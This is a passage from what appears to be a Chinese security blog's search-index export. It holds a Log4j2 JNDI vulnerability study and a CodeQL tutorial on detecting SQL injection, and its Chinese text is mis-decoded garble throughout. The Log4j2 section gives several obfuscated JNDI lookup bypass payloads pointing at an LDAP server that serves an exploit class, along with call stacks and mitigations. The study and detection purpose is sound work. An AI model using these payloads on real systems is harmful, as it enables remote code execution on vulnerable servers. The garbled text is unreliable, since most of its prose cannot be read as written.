LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) { StrLookup resolver = this.getVariableResolver(); return resolver == null ? null : resolver.lookup(event, variableName); } resolverè§£ææ—¶æ”¯æŒçš„å…³é”®è¯æœ‰[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œåˆ©ç”¨çš„jndi:xxxåç»­å°±ä¼šç”¨åˆ°JndiLookupè¿™ä¸ªè§£æå™¨ï¼Œè°ƒç”¨æ ˆ lookup:55, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) æœ€åè°ƒç”¨åˆ°log4j2åŸç”Ÿçš„ lookup() æ–¹æ³• ","date":"2025-04-13","objectID":"/posts/cde7a8a/:6:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"ç»•è¿‡å…¶é˜²å¾¡\rå…ˆæ˜¯ç»•è¿‡ é€’å½’è§£æç»•è¿‡ï¼šlog4j2 æ”¯æŒè¡¨è¾¾å¼é€’å½’è§£æï¼Œä¸‹é¢çš„è¡¨è¾¾å¼ä¼šé€å±‚è§£æï¼Œç”±äº :-æ˜¯é”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œè€Œè¡¨è¾¾å¼åªç®¡å–å€¼ï¼Œä»è€Œä½¿å¾— {::-j} -\u003e jï¼Œç±»ä¼¼çš„å¯ä»¥æ··æ·†å…¶ä»–å­—ç¬¦ã€‚ loggr.info(\"${${::-j}ndi:ldap://127.0.0.1:1099/exp}\"); logger.info(\"${${,:-j}ndi:ldap://127.0.0.1:1099/exp}\") lowwer / upper ç»•è¿‡ï¼šä½¿ç”¨ log4j2 æ”¯æŒçš„å…³é”®å­—ï¼Œå®ç°å¤§å°å†™ç»•è¿‡ logg.info(\"${${lower:J}ndi:ldap://127.0.0.1:1099/exp}\"); é˜²å¾¡ å…ˆæ˜¯æœ€ç®€å•çš„ï¼Œæ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬æˆ–è€…å®‰å…¨ç‰ˆæœ¬ï¼Œæ¯”å¦‚ 2.15.0-rc2 å®‰å…¨ç‰ˆæœ¬ï¼Œå¹¶ç¡®è®¤ä¸å¼€å¯ JNDI Lookup ï¼Œè¿˜æœ‰äº›ä¸´æ—¶åº”æ€¥æ“ä½œï¼Œæ¯”å¦‚ jvm æ·»åŠ  -Dlog4j2.formatMsgNoLookups=true å‚æ•°ï¼ˆä½¿å¾—noLookupä¸ºtrueï¼Œä¸ä¼šè¿›å…¥åˆ°lookupä¸­ï¼‰ ","date":"2025-04-13","objectID":"/posts/cde7a8a/:7:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"æ€»ç»“\rè°ƒç”¨æ ˆ lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2034, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi) info:1444, AbstractLogger (org.apache.logging.log4j.spi) main:16, test (com.example) sink ç‚¹æ˜¯ lo4j2 åŒ…ä¸‹çš„ JndiManager#lookup ç®€å•åˆ†æä¸‹åè§‰å¾—ç¡®å®æ— æ•Œï¼Œè¿™ä¹ˆåˆé’»çš„è§’åº¦éƒ½èƒ½æ‰¾åˆ°ï¼Œè¿™ä¸ªæ¼æ´çš„åŸç†å’Œåˆ©ç”¨éƒ½ä¸éš¾ï¼Œä½†ä»source åˆ†æè°ƒç”¨åˆ°æœ€åçš„sinkç‚¹ï¼ŒçœŸçš„å¾ˆå¼ºï¼Œä¸æ„§æ˜¯é˜¿é‡Œï¼Œå¬è¯´æ˜¯codeqlæ‰¾åˆ°çš„ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯çœŸçš„ï¼Œä½†ç”¨codeqlåº”è¯¥è½»æ¾ä¸å°‘ è¿˜æœ‰æ›´å¤šçš„ç»•è¿‡å’Œä¿®å¤ï¼Œä»¥åŠæ›´æ·±çš„åˆ©ç”¨åˆ†æï¼Œå¯ä»¥è§su18å¸ˆå‚…çš„æ–‡ç« ï¼šhttps://tttang.com/archive/1378/#toc_rc1 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:8:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://gaorenyusi.github.io/posts/log4j2/ https://jaspersec.top/posts/1237655284.html https://tttang.com/archive/1378/ ","date":"2025-04-13","objectID":"/posts/cde7a8a/:9:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"å‰è¨€\rCodeQL ä¸å¤šè¯´ï¼Œå¸®åŠ©æˆ‘ä»¬è¿›è¡Œä»£ç å®¡è®¡çš„ä¸€ä¸ªæŒºå¥½çš„å·¥å…· ","date":"2025-04-13","objectID":"/posts/28dc684/:1:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"CodeQL å®‰è£…\rCodeQLæœ¬èº«åŒ…å«ä¸¤éƒ¨åˆ†è§£æå¼•æ“+SDKã€‚ è§£æå¼•æ“ç”¨æ¥è§£ææˆ‘ä»¬ç¼–å†™çš„è§„åˆ™ï¼Œè™½ç„¶ä¸å¼€æºï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨å®˜ç½‘ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ç›´æ¥ä½¿ç”¨ã€‚ SDKå®Œå…¨å¼€æºï¼Œé‡Œé¢åŒ…å«å¤§éƒ¨åˆ†ç°æˆçš„æ¼æ´è§„åˆ™ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨å…¶ç¼–å†™è‡ªå®šä¹‰è§„åˆ™ã€‚ ","date":"2025-04-13","objectID":"/posts/28dc684/:2:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"å¼•æ“å®‰è£…\rå»åœ°å€ï¼šhttps://github.com/github/codeql-cli-binaries/releases ä¸‹è½½å·²ç»ç¼–è¯‘å¥½çš„codeqlæ‰§è¡Œç¨‹åºï¼Œè§£å‹ä¹‹åæŠŠcodeqlæ–‡ä»¶å¤¹æ”¾å…¥ï½/CodeQLï¼Œæˆ‘è¿™é‡Œæ˜¯ windows ï¼Œä¸‹çš„æ˜¯ codeql-win64.zip ä¸ºäº†æ–¹ä¾¿æµ‹è¯•æˆ‘ä»¬éœ€è¦æŠŠqlå¯æ‰§è¡Œç¨‹åºåŠ å…¥åˆ°ç¯å¢ƒå˜é‡å½“ä¸­ï¼š setx PATH \"E:\\CodeQL\\codeql;%PATH%\" ç„¶åé‡å¼€ä¸ªcmdè¾“å…¥ codeqlï¼Œå‡ºç°å¦‚ä¸‹å›¾å°±è¯´æ˜å¼•æ“è®¾ç½®å®Œæˆ ","date":"2025-04-13","objectID":"/posts/28dc684/:2:1","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"SDKå®‰è£…\råœ¨è¿™è¾¹ä¸‹è½½è§„åˆ™åº“æ–‡ä»¶https://github.com/github/codeqlï¼Œç”¨æ¥åœ¨åç»­åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ å°†è§£å‹åçš„æ–‡ä»¶æ”¾å…¥~/CodeQLä¸­ï¼Œä¹‹åè¾“å…¥codeql pack lsæ¥æŸ¥çœ‹å½“å‰SDKä¸­æ”¯æŒçš„è§„åˆ™é›†ã€‚ ","date":"2025-04-13","objectID":"/posts/28dc684/:2:2","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"VSCodeå¼€å‘æ’ä»¶å®‰è£…\råœ¨ vscode ä¸­å®‰è£… CodeQL æ’ä»¶ ç„¶ååœ¨è¯¥æ’ä»¶çš„è®¾ç½®ä¸­è®¾ç½® codeql çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼ˆè·¯å¾„ä¸­æœ€å¥½ä¸è¦æœ‰ä¸­æ–‡ï¼‰ ç„¶åå°±è®¾ç½®å¥½äº†ï¼Œæ¥ä¸‹æ¥å†™ä¸ªdemoæµ‹è¯•ä¸€ä¸‹ ","date":"2025-04-13","objectID":"/posts/28dc684/:2:3","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"demo\rç”±äºCodeQLçš„å¤„ç†å¯¹è±¡å¹¶ä¸æ˜¯æºç æœ¬èº«ï¼Œè€Œæ˜¯ä¸­é—´ç”Ÿæˆçš„ASTç»“æ„æ•°æ®åº“ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆéœ€è¦æŠŠæˆ‘ä»¬çš„é¡¹ç›®æºç è½¬æ¢æˆCodeQLèƒ½å¤Ÿè¯†åˆ«çš„CodeDatabaseã€‚ åˆ‡æ¢åˆ°æºä»£ç æ‰€åœ¨çš„ç›®å½•ç„¶åå†æ‰§è¡Œåˆ›å»ºæ•°æ®åº“çš„å‘½ä»¤ codeql database create \u003cæ•°æ®åº“å\u003e --language=\u003cè¯­è¨€æ ‡è¯†ç¬¦\u003e --source-root=\u003cæºç è·¯å¾„\u003e å¦‚æœæºä»£ç æ˜¯ä¸€ä¸ªMavené¡¹ç›®ï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨Mavenå‘½ä»¤æ¥æ„å»ºé¡¹ç›®ï¼Œå¹¶åœ¨åˆ›å»ºæ•°æ®åº“æ—¶æŒ‡å®šè¯¥å‘½ä»¤ --command=\"mvn clean install\" ä¸åŒçš„ language æ‰€å¯¹åº”çš„è¯­è¨€æ ‡è¯†ç¬¦ Language Identity C/C++ cpp C# csharp Go go Java java javascript/Typescript javascript Python python è¿™é‡Œæˆ‘ä¸»è¦æ˜¯ç”¨ codeql æ¥å®¡è®¡ java ä»£ç ï¼Œæ‰€ä»¥ç”¨ micro_service_seclab è¿™ä¸ªé¶åœºæ¥åšæµ‹è¯• codeql database create micro_service_seclab_database --language=\"java\" --command=\"mvn clean install -Dmaven.test.skip=true\" --source-root=E:\\CodeQL\\test\\micro_service_seclab ç¨å¾®è§£é‡Šä¸‹ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸ª micro_service_seclab_database å½“ä½œå­˜æ”¾æ•°æ®åº“çš„ç›®å½•ï¼ŒæŒ‡å®šè¯­è¨€ä¸ºjavaï¼Œç„¶åå†™å‡ºæ„å»ºå’Œæ¸…æ¥šå‘½ä»¤ï¼Œæœ€åæŒ‡å®šæºä»£ç è·Ÿç›®å½• ç„¶ååœ¨è¿™é‡ŒæŠŠç”Ÿæˆçš„ micro_service_seclab_database æ·»åŠ è¿›å» ç„¶åå‡ºç°è¿™ä¸ªå°±è¡¨ç¤ºæ•°æ®åº“åŠ è½½æˆåŠŸäº† æ¥ç€å†æ·»åŠ CodeQL SDKï¼šâ€œæ–‡ä»¶â€-â€œå°†æ–‡ä»¶å¤¹æ·»åŠ åˆ°å·¥ä½œåŒºâ€ ç„¶ååœ¨ sdk/java/ql ç›®å½•ä¸‹åˆ›å»ºä¸ª demo.ql æŸ¥è¯¢æ–‡ä»¶ï¼Œç„¶å Run Query on Selected Databaseï¼Œå°±ä¼šæ‰“å° heloooo test ","date":"2025-04-13","objectID":"/posts/28dc684/:3:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"åŸºæœ¬è¯­æ³•\rä»¥ä¸Šé¢çš„é¶åœºä¸ºä¾‹ å¯ä»¥çœ‹åˆ° CodeQL å¼•æ“çš„ä½œç”¨å°±æ˜¯å¸®æˆ‘ä»¬æŠŠæºç è½¬æ¢ä¸º CodeQL èƒ½è¯†åˆ«çš„æ•°æ®åº“ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½åšçš„å°±æ˜¯ç¼–å†™ QL è§„åˆ™ï¼Œå†é€šè¿‡å…¶å¼•æ“æ¥è¿è¡Œæˆ‘ä»¬çš„è§„åˆ™ï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°ä¸€ä¸ªè‡ªåŠ¨å®¡è®¡çš„åŠŸèƒ½ ","date":"2025-04-13","objectID":"/posts/28dc684/:4:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"QLè¯­æ³•\rimport java from int i where i = 1 select i ç¬¬ä¸€è¡Œè¡¨ç¤ºæˆ‘ä»¬è¦å¼•å…¥CodeQLçš„ç±»åº“ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥ java ä¸ºä¾‹ from int iï¼Œè¡¨ç¤ºæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå˜é‡iï¼Œå®ƒçš„ç±»å‹æ˜¯intï¼Œè¡¨ç¤ºæˆ‘ä»¬è·å–æ‰€æœ‰çš„intç±»å‹çš„æ•°æ® where i = 1, è¡¨ç¤ºå½“iç­‰äº1çš„æ—¶å€™ï¼Œç¬¦åˆæ¡ä»¶ select iï¼Œè¡¨ç¤ºè¾“å‡ºi å¦‚æœQLæ–‡ä»¶åœ¨ sdk\\java\\ql\\ ç›®å½•ä¸­æ—¶å°±ä¸éœ€è¦ import java äº†ï¼Œå› ä¸ºè¿™æ˜¯ CodeQL æ ‡å‡†åº“ç›®å½•ï¼Œå…¶ä¼šè‡ªåŠ¨éšå¼åŠ è½½è¯¥ç›®å½•ä¸‹çš„ä¾èµ–ï¼Œä½†å¦‚æœå†™åœ¨å…¶ä»–ç›®å½•ä¸‹å°±éœ€è¦æ‰‹åŠ¨ import java ï¼ŒåŒ…æ‹¬å…¶å­ç›®å½• è¿™é‡Œæˆ‘æ˜¯å†™åœ¨ sdk\\java\\ql\\examples ä¸‹çš„ï¼Œä¸Šé¢çš„ä»£ç å¾ˆå¥½ç†è§£ï¼Œæ‰€æœ‰intç±»å‹çš„æ•°æ®ä¸­ç­›é€‰å‡ºä¸º1çš„æƒ…å†µï¼Œè¾“å‡ºå°±æ˜¯ 1 QLæŸ¥è¯¢çš„è¯­æ³•ç»“æ„ä¸ºï¼š from [datatype] var where condition(var = something) select var ä»ä¸Šé¢çš„ä¾‹å­ä¸­æˆ‘ä»¬å‘ç°å®Œæ•´çš„QLè¯­æ³•æ— éå°±åˆ†ä¸‰éƒ¨åˆ†ï¼Œå…ˆæ˜¯é™å®šä¸€ä¸ªæŸ¥è¯¢çš„åŒºåŸŸï¼Œç„¶åå†™å‡ºè¿‡æ»¤è§„åˆ™ï¼Œæœ€åè¾“å‡º ","date":"2025-04-13","objectID":"/posts/28dc684/:4:1","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"ç±»åº“\rä¸Šé¢æˆ‘ä»¬è¯´äº†CodeQLå¼•æ“ä¼šå°†ä»£ç è½¬æ¢ä¸ºæ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“å…¶å®å°±æ˜¯å¯è¯†åˆ«çš„ASTæ•°æ®åº“ åœ¨ASTé‡Œé¢Methodä»£è¡¨çš„å°±æ˜¯ç±»å½“ä¸­çš„æ–¹æ³•ï¼›æ¯”å¦‚è¯´æˆ‘ä»¬æƒ³è¿‡çš„æ‰€æœ‰çš„æ–¹æ³•è°ƒç”¨ï¼ŒMethodAccessè·å–çš„å°±æ˜¯æ‰€æœ‰çš„æ–¹æ³•è°ƒç”¨ã€‚ æˆ‘ä»¬ç»å¸¸ä¼šç”¨åˆ°çš„qlç±»åº“å¤§ä½“å¦‚ä¸‹ï¼š åç§° è§£é‡Š Method æ–¹æ³•ç±»ï¼ŒMethod methodè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®ä¸­æ‰€æœ‰çš„æ–¹æ³• MethodAccess æ–¹æ³•è°ƒç”¨ç±»ï¼ŒMethodAccess callè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­çš„æ‰€æœ‰æ–¹æ³•è°ƒç”¨ Parameter å‚æ•°ç±»ï¼ŒParameterè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­æ‰€æœ‰çš„å‚æ•° ç»“åˆqlçš„è¯­æ³•ï¼Œæˆ‘ä»¬å°è¯•è·å–micro-service-seclabé¡¹ç›®å½“ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼š import java from Method kkk select kkk ç„¶åæ·»åŠ ä¸‹è¿‡æ»¤æ¡ä»¶ï¼Œç­›é€‰å‡ºåå­—ä¸º getStudent çš„æ–¹æ³•åç§° import java from Method k where k.hasName(\"getStudent\") select k.getName(), k.getDeclaringType() k.hashName() åˆ¤æ–­åå­—æ˜¯å¦åŒ¹é… k.getName() è·å–çš„æ˜¯å½“å‰æ–¹æ³•çš„åç§° k.getDeclaringType() è·å–çš„æ˜¯å½“å‰æ–¹æ³•æ‰€å±classçš„åç§° ","date":"2025-04-13","objectID":"/posts/28dc684/:4:2","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"è°“è¯\rå¦‚æœé™åˆ¶æ¡ä»¶æ¯”è¾ƒå¤šï¼Œwhere è¯­å¥å°±ä¼šå¾ˆå†—é•¿ã€‚CodeQLæä¾›ä¸€ç§æœºåˆ¶å¯ä»¥å¸®åŠ©æˆ‘ä»¬æŠŠå¾ˆé•¿çš„æŸ¥è¯¢è¯­å¥å°è£…æˆå‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°ï¼Œå°±å«è°“è¯ã€‚ æ¯”å¦‚ä¸Šé¢çš„æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆå¦‚ä¸‹ï¼Œè·å¾—çš„ç»“æœè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼š import java predicate isStudent(Method k) { k.getName()=\"getStudent\" } from Method k where isStudent(k) select k.getName(), k.getDeclaringType() predicate è¡¨ç¤ºå½“å‰æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ã€‚ ","date":"2025-04-13","objectID":"/posts/28dc684/:4:3","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"è®¾ç½®Sourceå’ŒSink\rä»€ä¹ˆæ˜¯sourceå’Œsink åœ¨ä»£ç è‡ªåŠ¨åŒ–å®‰å…¨å®¡è®¡çš„ç†è®ºå½“ä¸­ï¼Œæœ‰ä¸€ä¸ªæœ€æ ¸å¿ƒçš„ä¸‰å…ƒç»„æ¦‚å¿µï¼Œå°±æ˜¯(sourceï¼Œsinkå’Œsanitizer) sourceæ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„è¾“å…¥ç‚¹ã€‚æ¯”å¦‚è·å–httpè¯·æ±‚çš„å‚æ•°éƒ¨åˆ†ï¼Œå°±æ˜¯éå¸¸æ˜æ˜¾çš„Source sinkæ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„æ‰§è¡Œç‚¹ï¼Œæ¯”å¦‚SQLæ³¨å…¥æ¼æ´ï¼Œæœ€ç»ˆæ‰§è¡ŒSQLè¯­å¥çš„å‡½æ•°å°±æ˜¯sink(è¿™ä¸ªå‡½æ•°å¯èƒ½å«queryæˆ–è€…exeSqlï¼Œæˆ–è€…å…¶å®ƒ) sanitizeråˆå«å‡€åŒ–å‡½æ•°ï¼Œæ˜¯æŒ‡åœ¨æ•´ä¸ªçš„æ¼æ´é“¾æ¡å½“ä¸­ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ–¹æ³•é˜»æ–­äº†æ•´ä¸ªä¼ é€’é“¾ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±å«sanitizerï¼Œä¹Ÿå°±æ˜¯waf åªæœ‰å½“sourceå’ŒsinkåŒæ—¶å­˜åœ¨ï¼Œå¹¶ä¸”ä»sourceåˆ°sinkçš„é“¾è·¯æ˜¯é€šçš„ï¼Œæ‰è¡¨ç¤ºå½“å‰æ¼æ´æ˜¯å­˜åœ¨çš„ã€‚ è®¾ç½®Source åœ¨CodeQLä¸­æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥è®¾ç½®Source override predicate isSource(DataFlow::Node src) {} åœ¨è¿™ä¸ªé¶åœºä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯Spring Bootæ¡†æ¶ï¼Œé‚£ä¹ˆsourceå°±æ˜¯httpå‚æ•°å…¥å£çš„ä»£ç å‚æ•°ï¼Œæ¯”å¦‚åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œsourceå°±æ˜¯usernameï¼š @RequestMapping(value = \"/one\") public List\u003cStudent\u003e one(@RequestParam(value = \"username\") String username) { return indexLogic.getStudent(username); } æœ¬ä¾‹ä¸­æˆ‘ä»¬è®¾ç½®Sourceçš„ä»£ç ä¸ºï¼š override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } RemoteFlowSource æ˜¯ CodeQL æ ‡å‡†åº“ä¸­é¢„å®šä¹‰çš„ â€œè¿œç¨‹æ•°æ®æºâ€ ç±»ï¼Œæ¯”å¦‚HTTP è¯·æ±‚å‚æ•°ï¼Œç”¨æˆ·è¾“å…¥ä»¥åŠå…¶ä»–å¤–éƒ¨è¾“å…¥ç­‰éƒ½æ˜¯ è¿™æ˜¯SDKè‡ªå¸¦çš„è§„åˆ™ï¼Œé‡Œé¢åŒ…å«äº†å¤§å¤šå¸¸ç”¨çš„Sourceå…¥å£ã€‚æˆ‘ä»¬ä½¿ç”¨çš„SpringBootä¹ŸåŒ…å«åœ¨å…¶ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ æ³¨: instanceof è¯­æ³•æ˜¯CodeQLæä¾›çš„è¯­æ³•ï¼Œåé¢åœ¨CodeQLè¿›é˜¶éƒ¨åˆ†ä¼šæåˆ°ï¼Œè¿™é‡Œå°±æ˜¯æ£€æŸ¥è·å¾—çš„ src æ˜¯å¦ä¸º RemoteFlowSource è®¾ç½®Sink åœ¨CodeQLä¸­æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥è®¾ç½®Sink override predicate isSink(DataFlow::Node sink) {} åœ¨å®é™…ä¸­ï¼Œæˆ‘ä»¬æœ€åéƒ½æ˜¯è§¦å‘åˆ°æŸä¸ªæ¶æ„æ–¹æ³•ï¼Œå¦‚ getterï¼Œsetterï¼Œæ‰€ä»¥ sink åº”è¯¥æ˜¯ä¸ªæ–¹æ³•ï¼Œå‡è®¾æˆ‘ä»¬è¿™é‡Œçš„sink ç‚¹æ˜¯ä¸ªqueryæ–¹æ³•(Method)çš„è°ƒç”¨(MethodAccess)ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾ç½®Sinkä¸ºï¼š override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†existså­æŸ¥è¯¢ï¼Œè¿™ä¸ªæ˜¯CodeQLè°“è¯è¯­æ³•é‡Œéå¸¸å¸¸è§çš„è¯­æ³•ç»“æ„ï¼Œå®ƒæ ¹æ®å†…éƒ¨çš„å­æŸ¥è¯¢è¿”å›true or falseï¼Œæ¥å†³å®šç­›é€‰å‡ºå“ªäº›æ•°æ®ã€‚ sink.asExpr() = call.getArgument(0)ï¼šå°† sink èŠ‚ç‚¹è½¬æ¢ä¸ºè¡¨è¾¾å¼ï¼Œå¹¶æ£€æŸ¥å®ƒæ˜¯å¦ç­‰äº call çš„ç¬¬ä¸€ä¸ªå‚æ•° æ•…ä¸Šé¢sinkè¯­å¥çš„ä½œç”¨æ˜¯æŸ¥æ‰¾ä¸€ä¸ªquery()æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œå¹¶æŠŠå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºsink åœ¨é¶åœºç³»ç»Ÿ(micro-service-seclab)ä¸­ï¼Œsinkä¸º jdbcTemplate.query(sql, ROW_MAPPER); å½“åˆšæ‰è®¾ç½®çš„sourceå˜é‡æµå…¥è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œè¯´æ˜æ³¨å…¥ç‚¹å’Œè§¦å‘ç‚¹æ˜¯é€šçš„ï¼Œå°±èƒ½äº§ç”Ÿæ³¨å…¥æ¼æ´ ","date":"2025-04-13","objectID":"/posts/28dc684/:4:4","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"Flowæ•°æ®æµ\rè®¾ç½®å¥½Sourceå’ŒSinkï¼Œå°±ç›¸å½“äºæå®šäº†é¦–å°¾ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç–é€šä¸­é—´çš„åˆ©ç”¨é“¾ã€‚ä¸€ä¸ªå—æ±¡æŸ“çš„å˜é‡ï¼Œèƒ½å¤Ÿæ¯«æ— é˜»æ‹¦çš„æµè½¬åˆ°å±é™©å‡½æ•°ï¼Œå°±è¡¨ç¤ºå­˜åœ¨æ¼æ´ è¿™ä¸ªè¿é€šå·¥ä½œå°±æ˜¯CodeQLå¼•æ“æœ¬èº«æ¥å®Œæˆçš„ã€‚æˆ‘ä»¬é€šè¿‡ä½¿ç”¨config.hasFlowPath(source, sink)æ–¹æ³•æ¥åˆ¤æ–­æ˜¯å¦è¿é€šã€‚ æ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" æˆ‘ä»¬ä¼ é€’ç»™config.hasFlowPath(source, sink)æˆ‘ä»¬å®šä¹‰å¥½çš„sourceå’Œsinkï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´äº†ã€‚ source.getNode()ï¼šè·å–æºèŠ‚ç‚¹çš„åº•å±‚è¯­æ³•æ ‘èŠ‚ç‚¹ï¼ˆAST Nodeï¼‰ï¼Œæ˜¾ç¤ºæ¼æ´æºå¤´åœ¨ä»£ç ä¸­çš„å…·ä½“ä½ç½® ","date":"2025-04-13","objectID":"/posts/28dc684/:4:5","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"ä»£ç æµ‹è¯•\r","date":"2025-04-13","objectID":"/posts/28dc684/:5:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"åˆæ­¥æ£€æµ‹\rç»¼ä¸Šï¼Œå¯ä»¥å†™ä¸ª ql æŸ¥è¯¢ä»£ç æ¥æ£€æµ‹ sql æ³¨å…¥æ¼æ´ /** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\"} override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode 